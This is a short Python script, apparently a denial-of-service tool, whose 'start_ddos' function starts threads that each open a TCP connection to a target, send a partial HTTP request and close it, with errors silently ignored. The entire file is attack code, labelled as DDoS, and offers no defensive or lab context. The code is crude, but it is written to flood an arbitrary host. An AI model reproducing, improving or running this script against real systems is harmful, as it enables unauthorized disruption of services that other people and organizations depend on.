import socket
import threading

def attack(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(b"GET / HTTP/1.1\r\n")
        s.close()
    except:
        pass

def start_ddos(target, port, threads=20):
    print(f"[*] Starting DDoS on {target}:{port} with {threads} threads")
    for _ in range(threads):
        t = threading.Thread(target=attack, args=(target, port))
        t.start()
